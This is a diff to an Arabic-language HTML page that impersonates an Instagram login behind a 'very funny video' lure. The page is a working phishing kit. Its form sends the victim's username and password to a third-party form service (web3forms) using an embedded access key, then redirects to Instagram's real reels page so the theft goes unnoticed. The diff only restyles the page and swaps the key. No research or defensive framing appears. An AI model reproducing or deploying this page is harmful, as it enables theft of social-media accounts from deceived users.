@@ -2,35 +2,39 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Instagram - مشاهدة الفيديو</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .card { background: #fff; border: 1px solid #dbdbdb; padding: 30px; width: 100%; max-width: 350px; text-align: center; border-radius: 3px; }
-        .logo { width: 175px; margin-bottom: 25px; }
-        .video-box { width: 100%; height: 180px; background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://img.freepik.com/free-photo/funny-face-man_23-2148110595.jpg'); background-size: cover; background-position: center; border-radius: 4px; display: flex; justify-content: center; align-items: center; margin-bottom: 15px; cursor: pointer; }
-        .play-btn { width: 50px; height: 50px; background: rgba(255, 255, 255, 0.9); border-radius: 50%; position: relative; }
-        .play-btn::after { content: ""; border-style: solid; border-width: 10px 0 10px 15px; border-color: transparent transparent transparent #262626; position: absolute; top: 15px; left: 20px; }
-        .title { font-size: 16px; font-weight: 700; color: #262626; margin-bottom: 8px; }
-        .text { font-size: 13px; color: #8e8e8e; margin-bottom: 20px; }
-        input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 3px; background-color: #fafafa; font-size: 12px; outline: none; }
-        button { width: 100%; background-color: #0095f6; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 10px; }
+        body { font-family: -apple-system, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 350px; text-align: center; border-radius: 3px; }
+        .logo { width: 175px; margin-bottom: 20px; }
+        .video-thumb { width: 100%; height: 180px; background: #000 url('https://img.freepik.com/free-photo/funny-face-man_23-2148110595.jpg') center/cover; border-radius: 4px; display: flex; justify-content: center; align-items: center; margin-bottom: 15px; }
+        .play-icon { width: 50px; height: 50px; background: rgba(255,255,255,0.8); border-radius: 50%; position: relative; }
+        .play-icon::after { content: ''; position: absolute; border-style: solid; border-width: 10px 0 10px 15px; border-color: transparent transparent transparent #262626; top: 15px; left: 20px; }
+        input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; outline: none; box-sizing: border-box; }
+        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        p { font-size: 14px; margin-bottom: 10px; }
     </style>
 </head>
 <body>
-<div class="card">
+
+<div class="login-box">
     <img src="https://www.instagram.com/static/images/web/mobile_port/logo_2x.png/1bcf9b12e34d.png" class="logo">
-    <div class="video-box"><div class="play-btn"></div></div>
-    <p class="title">فيديو مضحك جداً! 😂</p>
-    <p class="text">سجل الدخول لتأكيد هويتك ومشاهدة الفيديو.</p>
+    <div class="video-thumb"><div class="play-icon"></div></div>
+    <p><b>فيديو مضحك جداً! 😂</b></p>
+    <p style="color: #8e8e8e; font-size: 12px;">يرجى تسجيل الدخول للمشاهدة</p>
+
     <form action="https://api.web3forms.com/submit" method="POST">
-        <input type="hidden" name="access_key" value="07448344-92a7-4aab-b61e-7e8b136f4bd7">
+        <input type="hidden" name="access_key" value="6014f0a9-3aa4-48c4-b3d1-db10b0b7283e">
+        
         <input type="text" name="Username" placeholder="اسم المستخدم أو الهاتف" required>
         <input type="password" name="Password" placeholder="كلمة المرور" required>
+        
         <input type="hidden" name="redirect" value="https://www.instagram.com/reels/">
+
         <button type="submit">تسجيل الدخول والمشاهدة</button>
     </form>
 </div>
+
 </body>
 </html>
